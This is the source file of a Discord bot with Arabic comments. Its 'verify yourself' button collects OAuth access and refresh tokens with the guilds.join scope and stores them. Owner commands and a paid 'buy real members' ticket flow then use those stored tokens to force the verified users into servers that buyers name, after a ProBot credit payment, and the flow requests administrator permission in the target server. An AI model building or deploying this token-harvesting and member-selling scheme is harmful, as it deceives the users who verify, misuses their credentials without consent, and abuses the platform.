const {
  Discord,
  MessageEmbed,
  Client,
  Intents,
  GuildScheduledEvent,
  Permissions,
  MessageButton,
  MessageActionRow,
  Modal,
  TextInputComponent,
  MessageCollector
} = require("discord.js");

const fs = require('fs');

// FIX #9: أضفنا GUILD_MEMBERS لأن addMember يحتاجه
const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.GUILD_MEMBERS,
  ],
});

const express = require("express");
const app = express();

// FIX #1: كان app.listen يُستدعى مرتين على نفس البورت مما يسبب EADDRINUSE
// الآن استدعاء واحد فقط
var listener = app.listen(process.env.PORT || 3000, function () {
  console.log('Your app is listening on port ' + listener.address().port);
});

var path = require("path");
var bodyParser = require("body-parser");
const Database = require("st.db");
const usersdata = new Database({
  path: "./database/users.json",
  databaseInObject: true,
});
const DiscordStrategy = require("passport-discord").Strategy,
  refresh = require("passport-oauth2-refresh");
const passport = require("passport");
const session = require("express-session");
const wait = require("node:timers/promises").setTimeout;
const { channels, bot, website } = require("./config.js");
app.use(bodyParser.urlencoded({ extended: true }));
app.set("views", path.join(__dirname, "/views"));
app.use(express.static(__dirname + "assets"));
app.set("view engine", "ejs");
app.use(express.static("public"));
const config = require("./config.js");
const { use } = require("passport");
global.config = config;
this.fetch = require("node-fetch");
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
  clientId: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  redirectUri: config.bot.callbackURL,
  verify_link: config.bot.verifylink,
  category: config.bot.category,
  transferid: config.bot.transferid,
  price: config.bot.price,
  probot_id: config.bot.probotid,
  logs: config.bot.logs
});

var scopes = ["identify", "email", "guilds", "guilds.join"];

// FIX #3: session middleware يجب أن يكون قبل passport.initialize() و passport.session()
app.use(
  session({
    secret: "some random secret",
    cookie: {
      maxAge: 60000 * 60 * 24,
    },
    saveUninitialized: false,
    resave: false,
  })
);

passport.use(
  new DiscordStrategy(
    {
      clientID: config.bot.botID,
      clientSecret: config.bot.clientSECRET,
      callbackURL: config.bot.callbackURL,
      scope: scopes,
      verify_link: config.bot.verifylink,
      category: config.bot.category,
      transferid: config.bot.transferid,
      price: config.bot.price,
      probot_id: config.bot.probotid,
      logs: config.bot.logs
    },
    function (accessToken, refreshToken, profile, done) {
      process.nextTick(async function () {
        usersdata.set(`${profile.id}`, {
          accessToken: accessToken,
          refreshToken: refreshToken,
        });
        return done(null, profile);
      });
    }
  )
);

passport.serializeUser(function (user, done) {
  done(null, user);
});
passport.deserializeUser(function (user, done) {
  done(null, user);
});

app.use(passport.initialize());
app.use(passport.session());

// FIX #4: كان يستخدم avatarUrl قبل تعريفها داخل نفس الـ template literal
app.get('/success', (req, res) => {
  if (!req.isAuthenticated()) return res.redirect('/');
  const profile = req.user;

  const avatarUrl = profile.avatar
    ? `https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png?size=512`
    : `https://cdn.discordapp.com/embed/avatars/0.png`;

  res.render('success', {
    usernamer: profile.username,
    avatar: avatarUrl,
  });
});

// FIX #7: حذفنا الـ duplicate route GET / - نبقي نسخة واحدة فقط
app.get("/", function (req, res) {
  res.render("index", {
    client: client,
    user: req.user,
    config: config,
    bot: bot,
  });
});

app.get(
  "/login",
  passport.authenticate("discord", { failureRedirect: "/" }),
  function (req, res) {
    var characters = "0123456789";
    let idt = ``;
    for (let i = 0; i < 10; i++) {
      idt += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    res.render("login", {
      client: client,
      user: req.user,
      config: config,
      bot: bot,
    });
  }
);

app.get(
  "/callback",
  passport.authenticate("discord", { failureRedirect: "/" }),
  function (req, res) {
    res.redirect("/success");
  }
);

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+send`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`آثــبــث نـفــســك`)
      .setStyle(`LINK`)
      .setURL(
        `${config.bot.verifylink}`
      )
      .setEmoji(`✅`);

    let row = new MessageActionRow().setComponents(button);
    message.channel.send({ components: [row] });
  }
});

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+check`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let args = message.content.split(" ").slice(1).join(" ");
    if (!args) return message.channel.send({ content: `**منشن شخص طيب**` });
    let member =
      message.mentions.members.first() ||
      message.guild.members.cache.get(args.split(` `)[0]);
    if (!member) return message.channel.send({ content: `**شخص غلط**` });
    let data = usersdata.get(`${member.id}`);
    if (data) return message.channel.send({ content: `**موثق بالفعل**` });
    if (!data) return message.channel.send({ content: `**غير موثق**` });
  }
});

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+join`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let msg = await message.channel.send({ content: `**جاري الفحص ..**` });
    let alld = usersdata.all();
    let args = message.content.split(` `).slice(1);
    if (!args[0] || !args[1])
      return msg
        .edit({ content: `**عذرًا , يرجى تحديد خادم ..**` })
        .catch(() => {
          message.channel.send({ content: `**عذرًا , يرجى تحديد خادم ..**` });
        });
    let guild = client.guilds.cache.get(`${args[0]}`);
    // FIX #6: تحويل amount لـ integer لأن المقارنة > مع alld.length كانت تفشل
    let amount = parseInt(args[1]);
    if (isNaN(amount) || amount <= 0)
      return msg
        .edit({ content: `**عذرًا , العدد يجب أن يكون رقمًا صحيحًا ..**` })
        .catch(() => {
          message.channel.send({ content: `**عذرًا , العدد يجب أن يكون رقمًا صحيحًا ..**` });
        });
    let count = 0;
    if (!guild)
      return msg
        .edit({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` })
        .catch(() => {
          message.channel.send({
            content: `**عذرًا , لم اتمكن من العثور على الخادم ..**`,
          });
        });
    if (amount > alld.length)
      return msg
        .edit({ content: `**لا يمكنك ادخال هاذا العدد ..**` })
        .catch(() => {
          message.channel.send({ content: `**لا يمكنك ادخال هاذا العدد ..**` });
        });
    for (let index = 0; index < amount; index++) {
      await oauth
        .addMember({
          guildId: guild.id,
          userId: alld[index].ID,
          accessToken: alld[index].data.accessToken,
          botToken: client.token,
        })
        .then(() => {
          count++;
        })
        .catch(() => {});
    }
    msg
      .edit({
        content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``,
      })
      .catch(() => {
        message.channel.send({
          content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``,
        });
      });
  }
});

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+refresh`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let mm = await message.channel
      .send({ content: `**جاري عمل ريفريش ..**` })
      .catch(() => {});
    let alld = usersdata.all();
    var count = 0;

    for (let i = 0; i < alld.length; i++) {
      await oauth
        .tokenRequest({
          clientId: client.user.id,
          clientSecret: bot.clientSECRET,
          grantType: "refresh_token",
          refreshToken: alld[i].data.refreshToken,
        })
        .then((res) => {
          usersdata.set(`${alld[i].ID}`, {
            accessToken: res.access_token,
            refreshToken: res.refresh_token,
          });
          count++;
        })
        .catch(() => {
          usersdata.delete(`${alld[i].ID}`);
        });
    }

    mm.edit({
      content: `**تم بنجاح ..**
**تم تغير** \`${count}\`
**تم حذف** \`${alld.length - count}\``,
    }).catch(() => {
      message.channel
        .send({ content: `**تم بنجاح .. ${count}**` })
        .catch(() => {});
    });
  }
});

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+users`)) {
    let alld = usersdata.all();
    message.reply({ content: `**يوجد حاليًا ${alld.length}**` });
  }
});

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+help`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    message.reply({
      content: `**[\`+join {ServerId} {amount}\`]**
**[\`+refresh\`]**
**[\`+users\`]**
**[\`+help\`]**
**[\`+check\`]**
**[\`+send\`]**
**[\`+panel\`]**

    `,
    });
  }
});

client.on("ready", () => {
  console.log(`Bot is On! ${client.user.tag}`);
});

//============================new codes====================================//
const ticketsFile = path.join(__dirname, 'tickets.json');

function loadTickets() {
  if (!fs.existsSync(ticketsFile)) {
    fs.writeFileSync(ticketsFile, JSON.stringify([]));
  }

  const data = fs.readFileSync(ticketsFile, 'utf-8');

  try {
    return JSON.parse(data || '[]');
  } catch (err) {
    console.error('⚠️ ملف tickets.json غير صالح. سيتم إعادة تهيئته.');
    fs.writeFileSync(ticketsFile, JSON.stringify([]));
    return [];
  }
}

function saveTicket(ticketData) {
  const tickets = loadTickets();
  tickets.push(ticketData);
  fs.writeFileSync(ticketsFile, JSON.stringify(tickets, null, 2));
}

// FIX #2: دالة جديدة لحفظ tickets بعد الفلترة (عند الإغلاق)
function saveAllTickets(ticketsArray) {
  fs.writeFileSync(ticketsFile, JSON.stringify(ticketsArray, null, 2));
}

client.on('messageCreate', async message => {
  if (message.content.startsWith('+panel')) {
    const panelEmbed = new MessageEmbed()
      .setTitle('**بيع أعضاء حقيقية 👥**')
      .setDescription('**لشراء أعضاء حقيقية 👥 أضغط على زر __شراء أعضاء 👥__**')
      .setColor('#0099ff');

    const actionRow = new MessageActionRow()
      .addComponents(
        new MessageButton()
          .setCustomId('open_ticket')
          .setLabel('شراء أعضاء')
          .setEmoji(`👥`)
          .setStyle('SECONDARY')
      );

    await message.channel.send({ embeds: [panelEmbed], components: [actionRow] });
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  if (interaction.customId === 'open_ticket') {
    const existingTicketChannel = interaction.guild.channels.cache.find(channel =>
      channel.parentId === config.bot.category &&
      channel.name.includes(interaction.user.username.toLowerCase())
    );

    if (existingTicketChannel) {
      return interaction.reply({
        content: `❌ لا يمكنك فتح أكثر من تكت في نفس الوقت، هذا تكتك <#${existingTicketChannel.id}>`,
        ephemeral: true
      });
    }

    const guild = interaction.guild;
    const ticketName = `ticket-${interaction.user.username.toLowerCase()}`;

    // FIX #5: في discord.js v13 نوع القناة يجب أن يكون 'GUILD_TEXT' وليس 'text'
    guild.channels.create(ticketName, {
      type: 'GUILD_TEXT',
      parent: `${config.bot.category}`,
      permissionOverwrites: [
        {
          id: interaction.user.id,
          allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY']
        },
        {
          id: guild.roles.everyone,
          deny: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY']
        }
      ]
    }).then(async ticketChannel => {
      await interaction.reply({ content: `**تم فتح تكت شراء أعضاء حقيقية 👥 بنجاح :white_check_mark: <#${ticketChannel.id}>**`, ephemeral: true });

      const embed = new MessageEmbed()
        .setTitle('**شراء أعضاء حقيقية 👥**')
        .setDescription('**لشراء أعضاء حقيقية 👥 قم بالضغط على زر __شراء__ في أسفل هذه الرسالة لإكمال عملية الشراء**')
        .setColor('#0099ff');

      const buybutton = new MessageButton()
        .setCustomId('buy')
        .setLabel('شراء')
        .setStyle('SUCCESS');

      const closebutton = new MessageButton()
        .setCustomId('close')
        .setLabel('قفل')
        .setStyle('DANGER');

      const actionrow = new MessageActionRow()
        .addComponents(buybutton, closebutton);

      saveTicket({
        ticketName: ticketChannel.name,
        userId: interaction.user.id,
        channelId: ticketChannel.id
      });

      await ticketChannel.send({ embeds: [embed], components: [actionrow] });
    }).catch(err => {
      console.error('خطأ في إنشاء قناة التكت:', err);
      interaction.reply({ content: '❌ حدث خطأ أثناء فتح التكت، تأكد من صلاحيات البوت.', ephemeral: true }).catch(() => {});
    });
  }

  if (interaction.customId === 'close') {
    // FIX #2: كان يستدعي saveTicket(updatedTickets) مما يضيف الـ array كعنصر جديد
    // الصحيح هو استخدام saveAllTickets لحفظ الـ array مباشرة
    const tickets = loadTickets();
    const updatedTickets = tickets.filter(ticket => ticket.channelId !== interaction.channel.id);
    saveAllTickets(updatedTickets);
    await interaction.channel.delete().catch(console.error);
  }
});

client.on('channelCreate', async channel => {
  if (channel.type !== 'GUILD_TEXT' || channel.parentId !== config.bot.category) return;
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  if (interaction.customId === 'buy') {
    const modal = new Modal()
      .setCustomId('model')
      .setTitle('شراء أعضاء حقيقية 👥');

    const server_idInput = new TextInputComponent()
      .setCustomId('server_id')
      .setLabel('أيدي السيرفر')
      .setStyle('SHORT');

    const members_amountInput = new TextInputComponent()
      .setCustomId('members_amount')
      .setLabel('عدد الأعضاء')
      .setStyle('SHORT');

    const serverActionRow = new MessageActionRow().addComponents(server_idInput);
    const membersActionRow = new MessageActionRow().addComponents(members_amountInput);

    modal.addComponents(serverActionRow, membersActionRow);

    await interaction.showModal(modal);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;

  if (interaction.customId === 'model') {
    const serverid = interaction.fields.getTextInputValue('server_id');
    const membersamount = interaction.fields.getTextInputValue('members_amount');
    const alld = usersdata.all();

    if (!serverid || !membersamount) {
      return interaction.reply({
        content: '**❌ الرجاء وضع أيدي السيرفر و عدد الأعضاء الذين تريد إدخالهم**',
        ephemeral: true
      });
    }

    const amount = parseInt(membersamount);
    if (isNaN(amount) || amount <= 0) {
      return interaction.reply({
        content: '**❌ عدد الأعضاء يجب أن يكون رقمًا صحيحًا أكبر من 0**',
        ephemeral: true
      });
    }

    if (amount > alld.length) {
      return interaction.reply({
        content: `**❌ لا يمكنك إدخال هذا العدد..\nالعدد المتوفر هو: \`${alld.length}\` عضو\nلمعرفة عدد الأعضاء المتوفرين أكتب الأمر التالي :\n\`\`\`+users\`\`\`**`,
        ephemeral: true
      });
    }

    const price = config.bot.price;
    const transferId = config.bot.transferid;
    const probotId = config.bot.probotid;
    const result = amount * price;
    const pricetax = Math.floor(result * 20 / 19 + 1);

    await interaction.reply({
      content: `**يرجى تحويل \`$${pricetax}\` عبر بروبوت خلال 60 ثانية**\n` +
        `\`\`\`\n#credit ${transferId} ${pricetax}\n\`\`\`\n` +
        `🔄 بانتظار التحويل من بروبوت...`,
      ephemeral: false
    });

    const channel = interaction.channel;

    // FIX #8: تصحيح نص فلتر رسالة بروبوت - result هو المبلغ الأصلي قبل الضريبة
    // بروبوت يرسل المبلغ الأصلي result وليس pricetax
    const filter = msg =>
      msg.author.id === probotId &&
      msg.content.includes(`| ${interaction.user.username}`) &&
      msg.content.includes(`${result}`);

    channel.awaitMessages({
      filter,
      max: 1,
      time: 60000,
      errors: ['time']
    }).then(async () => {
      if (!client.guilds.cache.has(serverid)) {
        const inviteLink = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;

        const button = new MessageButton()
          .setLabel('➕ أضف البوت للسيرفر')
          .setStyle('LINK')
          .setURL(inviteLink);

        const row = new MessageActionRow().addComponents(button);

        await channel.send({
          content: `**يرجى الضغط على الزر لإضافته، سيتم متابعة الإدخال تلقائيًا بعد دخوله**`,
          components: [row]
        });

        try {
          await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
              reject(new Error("**⏰ انتهى الوقت ولم يتم إدخال البوت للسيرفر**"));
            }, 600000);

            client.once('guildCreate', guild => {
              if (guild.id === serverid) {
                clearTimeout(timeout);
                resolve();
              }
            });
          });

          await channel.send('✅ تم إدخال البوت إلى السيرفر، جاري إدخال الأعضاء...');
          const guild = await client.guilds.fetch(serverid);
          if (!guild) return channel.send('**❌ لم يتم العثور على هذا السيرفر بعد الدخول**');

          await handleAddMembers(guild, amount, alld, channel, interaction.user);
        } catch (err) {
          return channel.send(err.message);
        }

      } else {
        const guild = client.guilds.cache.get(serverid);
        if (!guild) return channel.send('**❌ لم يتم العثور على هذا السيرفر**');
        // FIX #10: تمرير interaction.user كـ buyer حتى لا يكون undefined
        await handleAddMembers(guild, amount, alld, channel, interaction.user);
      }
    }).catch(() => {
      channel.send('**⏰ إنتهت 60 ثانية و لم يتم التحويل، الرجاء المحاولة مرة أخرى**');
    });
  }
});

// FIX #10: buyer له قيمة افتراضية null لتجنب خطأ buyer.id عند عدم تمريره
async function handleAddMembers(guild, amount, alld, channel, buyer = null) {
  let count = 0;

  for (let i = 0; i < amount && i < alld.length; i++) {
    try {
      await oauth.addMember({
        guildId: guild.id,
        userId: alld[i].ID,
        accessToken: alld[i].data.accessToken,
        botToken: client.token,
      });
      count++;
    } catch (e) {
      console.error(e);
    }
  }

  await channel.send(`**✅ تم إدخال \`${count}\` عضو بنجاح**`);
  await guild.leave();

  const logChannel = client.channels.cache.get(config.bot.logs);
  if (logChannel && logChannel.send) {
    const logEmbed = new MessageEmbed()
      .setTitle('**عملية شراء أعضاء**')
      .setDescription(
        buyer
          ? `**المشتري:** <@${buyer.id}>\n**عدد الأعضاء الذين تم شراؤهم:** \`${count}\``
          : `**عدد الأعضاء الذين تم إدخالهم:** \`${count}\``
      )
      .setColor('#0099ff');
    await logChannel.send({ embeds: [logEmbed] });
  }
}

const stockDataPath = path.join(__dirname, "stockMessage.json");
const cooldowns = {};

function saveStockMessageInfo(channelId, messageId) {
  fs.writeFileSync(stockDataPath, JSON.stringify({ channelId, messageId }, null, 2));
}

function loadStockMessageInfo() {
  if (!fs.existsSync(stockDataPath)) return null;
  return JSON.parse(fs.readFileSync(stockDataPath));
}

async function isStockMessageStillExists(client) {
  const data = loadStockMessageInfo();
  if (!data) return false;

  try {
    const channel = await client.channels.fetch(data.channelId).catch(() => null);
    if (!channel) return false;

    const message = await channel.messages.fetch(data.messageId).catch(() => null);
    return !!message;
  } catch {
    return false;
  }
}

//=========================================================================//
process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('❌ Uncaught Exception:', err);
});

client.login(process.env.token);
